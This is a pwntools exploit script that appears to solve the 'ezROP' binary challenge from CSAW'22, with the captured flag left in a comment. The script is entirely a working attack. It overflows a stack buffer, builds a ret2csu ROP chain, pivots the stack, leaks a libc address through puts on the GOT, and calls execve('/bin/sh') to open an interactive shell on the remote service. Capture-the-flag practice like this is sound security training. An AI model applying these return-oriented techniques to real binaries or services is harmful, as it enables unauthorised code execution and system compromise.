#!/usr/bin/env python3

from pwn import *

exe = ELF("./ezROP")
libc = ELF('./libc-2.31.so')

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.chal.csaw.io", 5002)

    return r


def main():
    r = conn()
    
    writeable = 0x00000000404000+0x500
    leave = 0x0000000000401302
    pop_csu = 0x000000000040159a
    call_csu = 0x0000000000401580
    pop_rsi = 0x00000000004015a1
    pop_rdi = 0x00000000004015a3
    
    """
    0x000000000040159a <+90>:	pop    rbx
   0x000000000040159b <+91>:	pop    rbp
   0x000000000040159c <+92>:	pop    r12
   0x000000000040159e <+94>:	pop    r13
   0x00000000004015a0 <+96>:	pop    r14
   0x00000000004015a2 <+98>:	pop    r15
    """
    
    payload = b"\0"*120
    payload += p64(pop_csu)
    payload += p64(0) # rbx
    payload += p64(1) # rbp
    payload += p64(0) # r12 -> edi
    payload += p64(writeable) # r13 -> rsi
    payload += p64(0x500) # r14 -> rdx
    payload += p64(exe.got.read) # r15 -> called
    payload += p64(call_csu)
    
    payload += p64(0) # add rsp, 8
    payload += p64(0) # rbx
    payload += p64(writeable-8) # rbp
    payload += p64(0) # r12 -> edi
    payload += p64(0) # r13 -> rsi
    payload += p64(0) # r14 -> rdx
    payload += p64(0) # r15 -> called
    payload += p64(leave)
    
    print('len:', len(payload))
    
    pause()
    r.sendline(payload)

    payload2 = b""
    payload2 += p64(pop_rdi)
    payload2 += p64(exe.got.setvbuf)
    payload2 += p64(exe.symbols.puts)
    payload2 += p64(pop_rdi)
    payload2 += p64(writeable+8*9)
    payload2 += p64(pop_rsi)
    payload2 += p64(0x500)*2
    payload2 += p64(exe.symbols.readn)
    
    r.sendline(payload2)
    
    r.recvuntil(b"o meet you, ! Welcome to CSAW'22!\n")
    libc_base = u64(r.readline().strip().ljust(8, b'\0')) - libc.symbols.setvbuf
    print('libc_base:', hex(libc_base))
    
    print('puts', hex(libc_base + libc.symbols.puts))
    
    payload3 = b""
    payload3 += p64(pop_rdi)
    payload3 += p64(next(libc.search(b'/bin/sh')) + libc_base)
    payload3 += p64(0x0000000000142c92 + libc_base) # pop rdx
    payload3 += p64(0)
    payload3 += p64(pop_rsi)
    payload3 += p64(0)*2
    payload3 += p64(libc.symbols.execve + libc_base)
    
    r.sendline(payload3)

    r.interactive() # flag{53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4}


if __name__ == "__main__":
    main()
